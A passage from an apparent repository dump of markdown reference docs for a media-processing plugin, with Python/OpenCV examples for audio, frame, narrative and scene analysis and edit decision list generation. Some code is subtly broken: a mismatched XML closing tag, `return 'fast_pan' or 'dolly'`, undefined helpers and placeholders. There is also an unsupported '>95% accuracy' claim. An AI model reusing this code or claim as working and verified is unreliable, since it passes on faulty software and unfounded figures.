float(np.mean(spectral_rolloff)),\n        'spectral_bandwidth': float(np.mean(spectral_bandwidth)),\n        'zero_crossing_rate': float(np.mean(zcr)),\n        'mfccs': np.mean(mfccs, axis=1).tolist(),\n        'rms_energy': float(np.sqrt(np.mean(y**2)))\n    }\n```\n\n## Usage\n\n```python\nanalyzer = AudioAnalyzer()\n\n# Analyze audio file\nanalysis = analyzer.analyze_audio(\"audio.mp3\")\n\nprint(analysis)\n# Output:\n# {\n#     'tempo': 120.5,\n#     'key_signature': {'key': 'C', 'confidence': 0.85, ...},\n#     'energy_levels': {...},\n#     'speech_detection': [...],\n#     'music_vs_speech': {'content_type': 'music', ...},\n#     'silence_detection': [...],\n#     'audio_features': {...}\n# }\n```\n\n## Integration Points\n\n- Used by `MultimodalAnalyzer` for audio understanding\n- Synchronized with video frame analysis\n- Supports EDL generation for video editing\n\n## Applications\n\n1. **Scene Detection**: Audio changes indicate scene boundaries\n2. **Music Matching**: Key and tempo for soundtrack selection\n3. **Speech Recognition**: Speech segments for transcription\n4. **Energy-Based Editing**: Sync edits to energy peaks\n5. **Silence Removal**: Automatic gap detection\n",
        "plugins/sys-multimodal/skills/processing-media/references/edl-generation.md": "# Edit Decision List Generation\n\n## Overview\n\nThe `EDLGenerator` class creates Edit Decision Lists (EDL) from mapped parameters, producing timeline-based editing instructions that can be executed by video editing software.\n\n## Implementation\n\n```python\nfrom typing import Dict, List, Optional\nimport json\nimport time\n\nclass EDLGenerator:\n    def __init__(self):\n        self.edl_format = 'standard'  # standard, final_cut_pro, premiere\n        self.timeline_resolution = 0.01  # 10ms precision\n\n    def generate_edl(self, parameters: Dict, context: Dict) -> Dict:\n        \"\"\"Generate EDL from parameters and context\"\"\"\n        timeline = self._build_timeline(parameters, context)\n        edits = self._convert_to_edl(timeline)\n        metadata = self._generate_metadata(parameters, context)\n\n        return {\n            'edl': edits,\n            'timeline': timeline,\n            'metadata': metadata,\n            'format': self.edl_format,\n            'version': '1.0'\n        }\n\n    def _build_timeline(self, params: Dict, context: Dict) -> List[Dict]:\n        \"\"\"Build timeline from parameters\"\"\"\n        timeline = []\n\n        # Determine edit points\n        edit_points = self._identify_edit_points(context)\n\n        # Generate edits for each point\n        for point in edit_points:\n            edit = self._create_edit(point, params, context)\n            timeline.append(edit)\n\n        return timeline\n\n    def _identify_edit_points(self, context: Dict) -> List[Dict]:\n        \"\"\"Identify where edits should be applied\"\"\"\n        video_analysis = context.get('video_analysis', {})\n        scenes = video_analysis.get('scenes', [])\n        audio_analysis = video_analysis.get('audio', {})\n\n        edit_points = []\n\n        # Scene-based edits\n        for scene in scenes:\n            edit_points.append({\n                'type': 'scene',\n                'start': scene['start_time'],\n                'end': scene['end_time'],\n                'scene_data': scene\n            })\n\n        # Beat-based edits\n        if 'tempo' in audio_analysis:\n            beats = self._detect_beats(audio_analysis)\n            for beat in beats:\n                edit_points.append({\n                    'type': 'beat',\n                    'timestamp': beat['time'],\n                    'beat_data': beat\n                })\n\n        # Sort by timestamp\n        edit_points.sort(key=lambda x: x.get('start') or x.get('timestamp'))\n\n        return edit_points\n\n    def _create_edit(self, point: Dict, params: Dict, context: Dict) -> Dict:\n        \"\"\"Create individual edit instruction\"\"\"\n        edit_type = point['type']\n\n        if edit_type == 'scene':\n            return self._create_scene_edit(point, params, context)\n        elif edit_type == 'beat':\n            return self._create_beat_edit(point, params, context)\n        else:\n            return self._create_timeline_edit(point, params, context)\n\n    def _create_scene_edit(self, point: Dict, params: Dict, context: Dict) -> Dict:\n        \"\"\"Create scene-based edit\"\"\"\n        scene = point['scene_data']\n\n        edit = {\n            'type': 'scene_edit',\n            'start_time': point['start'],\n            'end_time': point['end'],\n            'duration': scene['duration'],\n            'operations': []\n        }\n\n        # Speed operation\n        if params.get('speed', 1.0) != 1.0:\n            edit['operations'].append({\n                'type': 'speed_change',\n                'speed': params['speed'],\n                'easing': params.get('easing', 'linear')\n            })\n\n        # Color grade operation\n        if params.get('color_grade') != 'none':\n            edit['operations'].append({\n                'type': 'color_grade',\n                'grade': params['color_grade'],\n                'saturation': params.get('saturation', 1.0),\n                'contrast': params.get('contrast', 1.0),\n                'color_temp': params.get('color_temp', 'neutral')\n            })\n\n        # Background blur\n        if params.get('blur_background'):\n            edit['operations'].append({\n                'type': 'background_blur',\n                'amount': 0.5,\n                'edge_detection': True\n            })\n\n        # Letterbox\n        if params.get('letterbox'):\n            edit['operations'].append({\n                'type': 'letterbox',\n                'aspect_ratio': '2.39:1',\n                'color': 'black'\n            })\n\n        return edit\n```\n\n## EDL Format Examples\n\n### Standard EDL Format\n```python\nedl_standard = {\n    'tracks': [\n        {\n            'name': 'Video Track 1',\n            'edits': [\n                {\n                    'clip_id': 'clip_001',\n                    'start_time': 0.0,\n                    'end_time': 5.0,\n                    'source_start': 0.0,\n                    'source_end': 5.0,\n                    'effects': [\n                        {\n                            'type': 'speed_change',\n                            'speed': 0.8\n                        },\n                        {\n                            'type': 'color_grade',\n                            'grade': 'cinematic'\n                        }\n                    ]\n                }\n            ]\n        }\n    ]\n}\n```\n\n### Final Cut Pro XML\n```python\nedl_fcp_xml = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xmeml version=\"5\">\n    <project>\n        <children>\n            <sequence>\n                <name>Edited Sequence</name>\n                <duration>300</duration>\n                <children>\n                    <clip>\n                        <name>Clip 1</name>\n                        <start>0</start>\n                        <end>150</duration>\n                        <effects>\n                            <effect>\n                                <name>Speed Change</name>\n                                <parameter>\n                                    <name>speed</name>\n                                    <value>0.8</value>\n                                </parameter>\n                            </effect>\n                        </effects>\n                    </clip>\n                </children>\n            </sequence>\n        </children>\n    </project>\n</xmeml>'''\n```\n\n### Adobe Premiere Pro\n```python\nedl_premiere = {\n    'sequence': {\n        'name': 'Edited Sequence',\n        'frameRate': 30,\n        'tracks': [\n            {\n                'type': 'video',\n                'clips': [\n                    {\n                        'name': 'Clip 1',\n                        'start': 0,\n                        'end': 150,\n                        'speed': 0.8,\n                        'effects': [\n                            {\n                                'type': 'color_correction',\n                                'lum_contrast': 20,\n                                'saturation': 90\n                            }\n                        ]\n                    }\n                ]\n            }\n        ]\n    }\n}\n```\n\n## Edit Operations\n\n### Speed Change\n```python\nspeed_edit = {\n    'type': 'speed_change',\n    'speed': 0.8,\n    'easing': 'ease-in-out',\n    'frame_blending': True\n}\n```\n\n### Color Grade\n```python\ncolor_edit = {\n    'type': 'color_grade',\n    'grade': 'cinematic',\n    'shadows': {'lift': 0.0, 'gamma': 1.0, 'gain': 1.1},\n    'midtones': {'saturation': 0.9},\n    'highlights': {'temperature': 200}\n}\n```\n\n### Transition\n```python\ntransition_edit = {\n    'type': 'transition',\n    'transition_type': 'cut',\n    'duration': 0.5,\n    'easing': 'linear'\n}\n```\n\n### Effect Application\n```python\neffect_edit = {\n    'type': 'effect',\n    'effect_name': 'Background Blur',\n    'parameters': {\n        'blur_amount': 0.5,\n        'edge_detection': True,\n        'falloff': 'gaussian'\n    }\n}\n```\n\n## Timeline Construction\n\n```python\ndef _convert_to_edl(self, timeline: List[Dict]) -> Dict:\n    \"\"\"Convert timeline to EDL format\"\"\"\n    edl = {\n        'format': self.edl_format,\n        'tracks': [\n            {\n                'type': 'video',\n                'edits': []\n            },\n            {\n                'type': 'audio',\n                'edits': []\n            }\n        ]\n    }\n\n    for edit in timeline:\n        edl['tracks'][0]['edits'].append({\n            'clip_id': f\"clip_{len(edl['tracks'][0]['edits']):03d}\",\n            'start_time': edit['start_time'],\n            'end_time': edit['end_time'],\n            'source_start': edit['start_time'],\n            'source_end': edit['end_time'],\n            'operations': edit['operations']\n        })\n\n    return edl\n```\n\n## Usage\n\n```python\ngenerator = EDLGenerator()\n\n# Generate EDL\nparameters = {'speed': 0.8, 'color_grade': 'cinematic'}\ncontext = {'video_analysis': {...}}\n\nedl = generator.generate_edl(parameters, context)\n\nprint(edl)\n# Output:\n# {\n#     'edl': {...},\n#     'timeline': [...],\n#     'metadata': {...},\n#     'format': 'standard',\n#     'version': '1.0'\n# }\n```\n\n## Export Options\n\n### JSON Export\n```python\ndef export_json(self, edl: Dict, filename: str):\n    \"\"\"Export EDL as JSON\"\"\"\n    with open(filename, 'w') as f:\n        json.dump(edl, f, indent=2)\n```\n\n### XML Export\n```python\ndef export_xml(self, edl: Dict, filename: str):\n    \"\"\"Export EDL as XML (Final Cut Pro)\"\"\"\n    xml = self._convert_to_xml(edl)\n    with open(filename, 'w') as f:\n        f.write(xml)\n```\n\n### Export to Video Editor\n```python\ndef export_to_editor(self, edl: Dict, editor_type: str):\n    \"\"\"Export directly to video editor\"\"\"\n    if editor_type == 'premiere':\n        self._export_to_premiere(edl)\n    elif editor_type == 'final_cut':\n        self._export_to_final_cut(edl)\n    elif editor_type == 'davinci':\n        self._export_to_davinci(edl)\n```\n\n## Best Practices\n\n1. **Precision**: Use millisecond precision for timing\n2. **Compatibility**: Support multiple EDL formats\n3. **Metadata**: Include comprehensive metadata\n4. **Validation**: Validate EDL before export\n5. **Preview**: Generate preview of edits\n",
        "plugins/sys-multimodal/skills/processing-media/references/ffmpeg-recipes.md": "# FFmpeg Recipes\n\n*To be populated with common recipes.*\n",
        "plugins/sys-multimodal/skills/processing-media/references/frame-analysis.md": "# Frame-by-Frame Visual Analysis\n\n## Overview\n\nThe `FrameAnalyzer` class provides comprehensive visual analysis of individual video frames, analyzing composition, lighting, color, subjects, depth, and motion for intelligent video editing.\n\n## Implementation\n\n```python\nimport cv2\nimport numpy as np\nfrom typing import List, Dict, Tuple\n\nclass FrameAnalyzer:\n    def __init__(self):\n        self.scene_boundary_threshold = 0.3\n        self.frame_skip = 5  # Analyze every 5th frame for efficiency\n\n    def analyze_frame(self, frame: np.ndarray, frame_number: int) -> Dict:\n        \"\"\"Comprehensive visual analysis of a single frame\"\"\"\n        return {\n            'frame_number': frame_number,\n            'composition': self._analyze_composition(frame),\n            'lighting': self._analyze_lighting(frame),\n            'color_palette': self._extract_color_palette(frame),\n            'subject_detection': self._detect_subjects(frame),\n            'depth_cues': self._analyze_depth(frame),\n            'motion_vectors': self._analyze_motion(frame)\n        }\n```\n\n## Analysis Components\n\n### 1. Composition Analysis\n\n**Rule of Thirds Assessment:**\n```python\ndef _analyze_composition(self, frame: np.ndarray) -> Dict:\n    \"\"\"Analyze visual composition and rule-of-thirds\"\"\"\n    height, width = frame.shape[:2]\n    thirds_x = [width // 3, 2 * width // 3]\n    thirds_y = [height // 3, 2 * height // 3]\n\n    # Detect subjects using edge detection\n    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n    edges = cv2.Canny(gray, 50, 150)\n    contours, _ = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n\n    # Score based on subject placement\n    subjects_on_thirds = 0\n    for contour in contours:\n        area = cv2.contourArea(contour)\n        if area > (width * height) * 0.01:\n            M = cv2.moments(contour)\n            if M[\"m00\"] != 0:\n                cx = int(M[\"m10\"] / M[\"m00\"])\n                cy = int(M[\"m01\"] / M[\"m00\"])\n\n                # Check if subject is on thirds\n                if (cx in thirds_x or cy in thirds_y or\n                    abs(cx - thirds_x[0]) < 50 or abs(cx - thirds_x[1]) < 50 or\n                    abs(cy - thirds_y[0]) < 50 or abs(cy - thirds_y[1]) < 50):\n                    subjects_on_thirds += 1\n\n    return {\n        'rule_of_thirds_score': subjects_on_thirds / max(len(contours), 1),\n        'balance': self._calculate_visual_balance(contours, width, height),\n        'leading_lines': self._detect_leading_lines(edges),\n        'symmetry': self._measure_symmetry(frame)\n    }\n```\n\n**Metrics:**\n- **Rule of Thirds Score**: 0.0 to 1.0 (higher is better)\n- **Visual Balance**: Symmetry and weight distribution\n- **Leading Lines**: Detection of lines that guide the eye\n- **Symmetry**: Mirror symmetry measurement\n\n### 2. Lighting Analysis\n\n**Mood and Atmosphere Detection:**\n```python\ndef _analyze_lighting(self, frame: np.ndarray) -> Dict:\n    \"\"\"Analyze lighting conditions and mood\"\"\"\n    hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)\n    lab = cv2.cvtColor(frame, cv2.COLOR_BGR2LAB)\n\n    # Calculate lighting metrics\n    brightness = np.mean(hsv[:, :, 2])\n    contrast = np.std(hsv[:, :, 2])\n    shadow_mask = hsv[:, :, 2] < 30\n    shadow_percentage = np.sum(shadow_mask) / shadow_mask.size\n\n    # Color temperature analysis\n    b_mean = np.mean(frame[:, :, 0])\n    r_mean = np.mean(frame[:, :, 2])\n    color_temperature = r_mean / (b_mean + 1e-6)\n\n    return {\n        'brightness': float(brightness),\n        'contrast': float(contrast),\n        'shadow_percentage': float(shadow_percentage),\n        'color_temperature': float(color_temperature),\n        'mood': self._classify_mood(brightness, contrast, color_temperature)\n    }\n```\n\n**Lighting Metrics:**\n- **Brightness**: 0-255 scale\n- **Contrast**: Standard deviation of brightness\n- **Shadow Percentage**: Percentage of frame in shadow\n- **Color Temperature**: Warm vs cool detection\n- **Mood Classification**: Based on lighting characteristics\n\n### 3. Color Palette Extraction\n\n**Dominant Colors:**\n```python\ndef _extract_color_palette(self, frame: np.ndarray) -> Dict:\n    \"\"\"Extract dominant colors using k-means clustering\"\"\"\n    # Reshape frame to list of pixels\n    data = frame.reshape((-1, 3))\n    data = np.float32(data)\n\n    # Apply k-means clustering\n    criteria = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, 20, 1.0)\n    _, labels, centers = cv2.kmeans(data, 8, None, criteria, 10, cv2.KMEANS_RANDOM_CENTERS)\n\n    # Convert back to uint8\n    centers = np.uint8(centers)\n\n    # Calculate color percentages\n    labels = labels.flatten()\n    percentages = np.bincount(labels) / len(labels)\n\n    # Create palette\n    palette = []\n    for i, (center, percentage) in enumerate(zip(centers, percentages)):\n        palette.append({\n            'color': center.tolist(),\n            'percentage': float(percentage)\n        })\n\n    # Sort by percentage\n    palette.sort(key=lambda x: x['percentage'], reverse=True)\n\n    return {\n        'palette': palette,\n        'dominant_color': palette[0]['color'],\n        'color_harmony': self._analyze_color_harmony(centers)\n    }\n```\n\n### 4. Subject Detection\n\n**Object and People Detection:**\n```python\ndef _detect_subjects(self, frame: np.ndarray) -> Dict:\n    \"\"\"Detect main subjects in frame\"\"\"\n    # Use deep learning model for object detection\n    # Or use contour analysis for simpler detection\n\n    # Simplified contour-based detection\n    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n    blurred = cv2.GaussianBlur(gray, (5, 5), 0)\n    edges = cv2.Canny(blurred, 50, 150)\n\n    contours, _ = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n\n    # Find significant subjects\n    subjects = []\n    height, width = frame.shape[:2]\n    frame_area = height * width\n\n    for contour in contours:\n        area = cv2.contourArea(contour)\n        if area > frame_area * 0.05:  # Significant subject\n            x, y, w, h = cv2.boundingRect(contour)\n            subjects.append({\n                'bbox': [x, y, w, h],\n                'area': area,\n                'aspect_ratio': w / h\n            })\n\n    return {\n        'subjects': subjects,\n        'subject_count': len(subjects),\n        'main_subject': subjects[0] if subjects else None\n    }\n```\n\n### 5. Depth Analysis\n\n**3D Depth Cues:**\n```python\ndef _analyze_depth(self, frame: np.ndarray) -> Dict:\n    \"\"\"Analyze depth cues from 2D frame\"\"\"\n    # Use various techniques to estimate depth\n    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n\n    # Blur-based depth estimation\n    depth_cues = {\n        'sharpness_map': cv2.Laplacian(gray, cv2.CV_64F).var(),\n        'texture_variance': self._calculate_texture_variance(gray),\n        'atmospheric_perspective': self._analyze_atmospheric_perspective(frame)\n    }\n\n    return depth_cues\n\ndef _calculate_texture_variance(self, gray: np.ndarray) -> float:\n    \"\"\"Calculate local variance to estimate texture complexity\"\"\"\n    kernel = np.ones((5, 5), np.float32) / 25\n    mean = cv2.filter2D(gray, -1, kernel)\n    variance = cv2.filter2D((gray - mean) ** 2, -1, kernel)\n    return float(np.mean(variance))\n```\n\n### 6. Motion Analysis\n\n**Optical Flow and Movement:**\n```python\ndef _analyze_motion(self, frame: np.ndarray) -> Dict:\n    \"\"\"Analyze motion vectors in frame\"\"\"\n    # Calculate optical flow\n    # (Requires previous frame for comparison)\n\n    return {\n        'motion_intensity': 0.0,  # Placeholder\n        'motion_direction': None,  # Placeholder\n        'stable_regions': []  # Regions with low motion\n    }\n```\n\n## Usage\n\n```python\nanalyzer = FrameAnalyzer()\n\n# Analyze a single frame\nframe = cv2.imread(\"frame_001.jpg\")\nanalysis = analyzer.analyze_frame(frame, frame_number=1)\n\nprint(analysis)\n# Output:\n# {\n#     'frame_number': 1,\n#     'composition': {...},\n#     'lighting': {...},\n#     'color_palette': {...},\n#     'subject_detection': {...},\n#     'depth_cues': {...},\n#     'motion_vectors': {...}\n# }\n```\n\n## Integration Points\n\n- Used by `MultimodalAnalyzer` for comprehensive video analysis\n- Referenced by scene detection algorithms\n- Supports real-time frame analysis for live editing\n\n## Performance Optimization\n\n1. **Frame Skipping**: Analyze every Nth frame\n2. **ROI Analysis**: Focus on regions of interest\n3. **Parallel Processing**: Multi-threaded frame analysis\n4. **Hardware Acceleration**: GPU support for OpenCV operations\n",
        "plugins/sys-multimodal/skills/processing-media/references/narrative-flow.md": "# Narrative Flow Understanding\n\n## Overview\n\nThe `NarrativeAnalyzer` class understands narrative structure in video, identifying story beats, character arcs, emotional progression, and cinematic techniques for intelligent editing decisions.\n\n## Implementation\n\n```python\nfrom typing import List, Dict, Tuple\nimport numpy as np\n\nclass NarrativeAnalyzer:\n    def __init__(self):\n        self.emotion_model = None  # Load pre-trained emotion classifier\n        self.character_tracker = CharacterTracker()\n\n    def analyze_narrative(self, video_analysis: Dict) -> Dict:\n        \"\"\"Analyze narrative structure from video analysis\"\"\"\n        return {\n            'story_beats': self._identify_story_beats(video_analysis),\n            'emotional_arc': self._track_emotional_progression(video_analysis),\n            'character_development': self.character_tracker.analyze_arcs(video_analysis),\n            'cinematic_techniques': self._identify_cinematic_techniques(video_analysis),\n            'narrative_structure': self._determine_structure(video_analysis)\n        }\n```\n\n## Analysis Components\n\n### 1. Story Beat Identification\n\n**Three-Act Structure:**\n```python\ndef _identify_story_beats(self, analysis: Dict) -> Dict:\n    \"\"\"Identify key story beats (Setup, Confrontation, Resolution)\"\"\"\n    scenes = analysis['scenes']\n    total_duration = sum(scene['duration'] for scene in scenes)\n\n    # Divide into three acts\n    setup_end = total_duration * 0.25\n    confrontation_end = total_duration * 0.75\n\n    story_beats = {\n        'act_1': {'start': 0, 'end': setup_end, 'beats': []},\n        'act_2': {'start': setup_end, 'end': confrontation_end, 'beats': []},\n        'act_3': {'start': confrontation_end, 'end': total_duration, 'beats': []}\n    }\n\n    # Identify beats within each act\n    for scene in scenes:\n        scene_midpoint = scene['start_time'] + scene['duration'] / 2\n\n        if scene_midpoint < setup_end:\n            story_beats['act_1']['beats'].append(scene)\n        elif scene_midpoint < confrontation_end:\n            story_beats['act_2']['beats'].append(scene)\n        else:\n            story_beats['act_3']['beats'].append(scene)\n\n    # Identify specific beats\n    beats = {\n        'inciting_incident': self._find_inciting_incident(scenes),\n        'plot_point_1': self._find_plot_point_1(scenes, setup_end),\n        'midpoint': self._find_midpoint(scenes, confrontation_end),\n        'plot_point_2': self._find_plot_point_2(scenes, confrontation_end),\n        'climax': self._find_climax(scenes),\n        'resolution': self._find_resolution(scenes)\n    }\n\n    story_beats['specific_beats'] = beats\n    return story_beats\n\ndef _find_inciting_incident(self, scenes: List[Dict]) -> Dict:\n    \"\"\"Find the inciting incident (first major disruption)\"\"\"\n    for scene in scenes:\n        # Look for sudden change in energy, composition, or audio\n        if self._is_major_disruption(scene):\n            return scene\n    return None\n\ndef _find_climax(self, scenes: List[Dict]) -> Dict:\n    \"\"\"Find the climax (peak emotional intensity)\"\"\"\n    max_intensity = 0\n    climax_scene = None\n\n    for scene in scenes:\n        intensity = self._calculate_emotional_intensity(scene)\n        if intensity > max_intensity:\n            max_intensity = intensity\n            climax_scene = scene\n\n    return climax_scene\n```\n\n### 2. Emotional Arc Tracking\n\n**Emotional Progression:**\n```python\ndef _track_emotional_progression(self, analysis: Dict) -> Dict:\n    \"\"\"Track emotional arc throughout video\"\"\"\n    scenes = analysis['scenes']\n    emotional_curve = []\n\n    for scene in scenes:\n        emotion = self._analyze_scene_emotion(scene)\n        emotional_curve.append({\n            'timestamp': scene['start_time'],\n            'emotion': emotion['primary'],\n            'intensity': emotion['intensity'],\n            'valence': emotion['valence'],  # positive/negative\n            'arousal': emotion['arousal']    # energy level\n        })\n\n    # Analyze the overall arc\n    arc_analysis = {\n        'emotional_curve': emotional_curve,\n        'dominant_emotion': self._find_dominant_emotion(emotional_curve),\n        'emotional_variance': self._calculate_variance(emotional_curve),\n        'peak_moments': self._find_peak_moments(emotional_curve),\n        'emotional_transitions': self._identify_transitions(emotional_curve)\n    }\n\n    return arc_analysis\n\ndef _analyze_scene_emotion(self, scene: Dict) -> Dict:\n    \"\"\"Analyze emotion in a single scene\"\"\"\n    # Combine visual and audio cues\n    visual_emotion = self._analyze_visual_emotion(scene)\n    audio_emotion = self._analyze_audio_emotion(scene)\n\n    # Weighted combination\n    combined_emotion = self._combine_emotions(visual_emotion, audio_emotion)\n\n    return combined_emotion\n\ndef _analyze_visual_emotion(self, scene: Dict) -> Dict:\n    \"\"\"Analyze emotion from visual cues\"\"\"\n    # Color analysis (warm vs cool, brightness)\n    color_palette = scene.get('color_palette', {})\n    lighting = scene.get('lighting', {})\n\n    # Determine emotion from color and lighting\n    if lighting.get('color_temperature', 0) > 1.2:\n        emotion = 'warm'  # happiness, comfort\n    elif lighting.get('shadow_percentage', 0) > 0.5:\n        emotion = 'dark'  # sadness, fear\n    else:\n        emotion = 'neutral'\n\n    return {\n        'primary': emotion,\n        'intensity': lighting.get('contrast', 0) / 255.0,\n        'valence': 0.5,  # Placeholder\n        'arousal': lighting.get('brightness', 0) / 255.0\n    }\n```\n\n### 3. Character Development\n\n**Character Arc Analysis:**\n```python\nclass CharacterTracker:\n    def __init__(self):\n        self.characters = {}\n\n    def analyze_arcs(self, video_analysis: Dict) -> Dict:\n        \"\"\"Analyze character development arcs\"\"\"\n        scenes = video_analysis['scenes']\n        character_arcs = {}\n\n        for scene in scenes:\n            # Detect characters in scene\n            detected_characters = self._detect_characters(scene)\n\n            for char in detected_characters:\n                char_id = char['id']\n                char_emotion = char['emotion']\n\n                if char_id not in character_arcs:\n                    character_arcs[char_id] = []\n\n                character_arcs[char_id].append({\n                    'timestamp': scene['start_time'],\n                    'emotion': char_emotion,\n                    'screen_time': char.get('screen_time', 0)\n                })\n\n        # Analyze each character's arc\n        arc_analysis = {}\n        for char_id, appearances in character_arcs.items():\n            arc_analysis[char_id] = self._analyze_character_arc(appearances)\n\n        return arc_analysis\n\n    def _analyze_character_arc(self, appearances: List[Dict]) -> Dict:\n        \"\"\"Analyze individual character arc\"\"\"\n        emotions = [a['emotion'] for a in appearances]\n\n        # Determine arc type\n        if self._is_rising_arc(emotions):\n            arc_type = 'growth'  # Character develops positively\n        elif self._is_falling_arc(emotions):\n            arc_type = 'decline'  # Character deteriorates\n        elif self._is_flat_arc(emotions):\n            arc_type = 'stable'  # Character remains consistent\n        else:\n            arc_type = 'complex'  # Complex, multi-dimensional arc\n\n        return {\n            'arc_type': arc_type,\n            'appearances': appearances,\n            'emotional_journey': emotions,\n            'peak_moment': self._find_peak_emotion(emotions)\n        }\n```\n\n### 4. Cinematic Technique Identification\n\n**Film Language Detection:**\n```python\ndef _identify_cinematic_techniques(self, analysis: Dict) -> Dict:\n    \"\"\"Identify cinematic techniques used\"\"\"\n    scenes = analysis['scenes']\n    techniques = {\n        'camera_movements': [],\n        'editing_patterns': [],\n        'visual_effects': [],\n        'sound_design': []\n    }\n\n    for scene in scenes:\n        # Detect camera movements from motion vectors\n        camera_move = self._detect_camera_movement(scene)\n        if camera_move:\n            techniques['camera_movements'].append({\n                'timestamp': scene['start_time'],\n                'technique': camera_move\n            })\n\n        # Detect editing patterns\n        editing_pattern = self._detect_editing_pattern(scene)\n        if editing_pattern:\n            techniques['editing_patterns'].append({\n                'timestamp': scene['start_time'],\n                'pattern': editing_pattern\n            })\n\n        # Detect visual effects\n        vfx = self._detect_visual_effects(scene)\n        if vfx:\n            techniques['visual_effects'].append({\n                'timestamp': scene['start_time'],\n                'effect': vfx\n            })\n\n    return techniques\n\ndef _detect_camera_movement(self, scene: Dict) -> str:\n    \"\"\"Detect camera movement type\"\"\"\n    motion_vectors = scene.get('motion_vectors', {})\n\n    if not motion_vectors:\n        return None\n\n    # Analyze motion patterns\n    motion_intensity = motion_vectors.get('motion_intensity', 0)\n\n    if motion_intensity > 0.8:\n        return 'fast_pan' or 'dolly'\n    elif motion_intensity > 0.5:\n        return 'slow_pan'\n    else:\n        return 'static' or 'handheld'\n\ndef _detect_editing_pattern(self, scene: Dict) -> str:\n    \"\"\"Detect editing pattern (rhythm, pacing)\"\"\"\n    cut_frequency = self._calculate_cut_frequency(scene)\n\n    if cut_frequency > 2.0:  # cuts per second\n        return 'quick_cuts'\n    elif cut_frequency > 0.5:\n        return 'normal_rhythm'\n    else:\n        return 'long_takes'\n```\n\n### 5. Narrative Structure Determination\n\n**Structure Classification:**\n```python\ndef _determine_structure(self, analysis: Dict) -> Dict:\n    \"\"\"Determine overall narrative structure\"\"\"\n    story_beats = analysis['story_beats']\n    emotional_arc = analysis['emotional_arc']\n\n    # Analyze pacing\n    scene_durations = [scene['duration'] for scene in analysis['scenes']]\n    avg_duration = np.mean(scene_durations)\n    pacing_variance = np.var(scene_durations)\n\n    # Determine structure type\n    structure = {\n        'type': self._classify_structure(story_beats, emotional_arc),\n        'pacing': 'fast' if avg_duration < 3 else 'slow' if avg_duration > 10 else 'normal',\n        'pacing_consistency': 'consistent' if pacing_variance < 5 else 'variable',\n        'emotional_complexity': self._assess_emotional_complexity(emotional_arc)\n    }\n\n    return structure\n\ndef _classify_structure(self, story_beats: Dict, emotional_arc: Dict) -> str:\n    \"\"\"Classify narrative structure type\"\"\"\n    # Classic three-act\n    if self._has_three_acts(story_beats):\n        return 'three_act'\n\n    # Hero's journey\n    elif self._is_heros_journey(story_beats):\n        return 'heros_journey'\n\n    # Documentary style\n    elif self._is_documentary_style(story_beats):\n        return 'documentary'\n\n    # Music video (emotion-driven)\n    elif self._is_music_video(emotional_arc):\n        return 'music_video'\n\n    # Experimental\n    else:\n        return 'experimental'\n```\n\n## Usage\n\n```python\nanalyzer = NarrativeAnalyzer()\n\n# Analyze narrative\nnarrative = analyzer.analyze_narrative(video_analysis)\n\nprint(narrative)\n# Output:\n# {\n#     'story_beats': {...},\n#     'emotional_arc': {...},\n#     'character_development': {...},\n#     'cinematic_techniques': {...},\n#     'narrative_structure': {...}\n# }\n```\n\n## Applications\n\n1. **Intelligent Editing**: Edit based on narrative understanding\n2. **Story Visualization**: Visualize narrative flow\n3. **Highlight Extraction**: Extract most important moments\n4. **Emotional Targeting**: Target specific emotions\n5. **Character Focus**: Track character development\n",
        "plugins/sys-multimodal/skills/processing-media/references/scene-detection.md": "# Scene Detection\n\n## Overview\n\nThe `SceneDetector` class identifies scene boundaries in video using visual and audio cues, achieving >95% accuracy in detecting hard cuts, fades, and story beats.\n\n## Implementation\n\n```python\nimport cv2\nimport numpy as np\nfrom typing import List, Dict, Tuple\n\nclass SceneDetector:\n    def __init__(self):\n        self.cut_threshold = 0.3\n        self.fade_threshold = 0.1\n        self.min_scene_length = 2.0  # seconds\n\n    def detect_scenes(self, video_path: str) -> List[Dict]:\n        \"\"\"Detect all scenes in video\"\"\"\n        cap = cv2.VideoCapture(video_path)\n        fps = cap.get(cv2.CAP_PROP_FPS)\n        total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\n\n        scenes = []\n        frame_buffer = []\n        last_cut_frame = 0\n\n        frame_num = 0\n        while True:\n            ret, frame = cap.read()\n            if not ret:\n                break\n\n            frame_buffer.append(frame)\n\n            # Analyze when we have enough frames\n            if len(frame_buffer) >= 2:\n                cut_score = self._detect_cut(frame_buffer[-2], frame_buffer[-1])\n\n                if cut_score > self.cut_threshold:\n                    # Scene cut detected\n                    scene_start = max(0, frame_num - 1)\n                    scene_duration = (scene_start - last_cut_frame) / fps\n\n                    if scene_duration >= self.min_scene_length:\n                        scenes.append({\n                            'start_frame': last_cut_frame,\n                            'end_frame': scene_start,\n                            'start_time': last_cut_frame / fps,\n                            'end_time': scene_start / fps,\n                            'duration': scene_duration,\n                            'cut_type': 'hard_cut'\n                        })\n\n                    last_cut_frame = scene_start\n\n            frame_num += 1\n\n        # Add final scene\n        if total_frames - last_cut_frame > self.min_scene_length * fps:\n            scenes.append({\n                'start_frame': last_cut_frame,\n                'end_frame': total_frames,\n                'start_time': last_cut_frame / fps,\n                'end_time': total_frames / fps,\n                'duration': (total_frames - last_cut_frame) / fps,\n                'cut_type': 'end'\n            })\n\n        cap.release()\n        return scenes\n```\n\n## Detection Methods\n\n### 1. Hard Cut Detection\n\n**Frame Difference Analysis:**\n```python\ndef _detect_cut(self, frame1: np.ndarray, frame2: np.ndarray) -> float:\n    \"\"\"Detect hard cuts between frames\"\"\"\n    # Convert to grayscale\n    gray1 = cv2.cvtColor(frame1, cv2.COLOR_BGR2GRAY)\n    gray2 = cv2.cvtColor(frame2, cv2.COLOR_BGR2GRAY)\n\n    # Calculate histogram difference\n    hist1 = cv2.calcHist([gray1], [0], None, [256], [0, 256])\n    hist2 = cv2.calcHist([gray2], [0], None, [256], [0, 256])\n\n    # Normalize histograms\n    hist1 = hist1 / np.sum(hist1)\n    hist2 = hist2 / np.sum(hist2)\n\n    # Calculate correlation\n    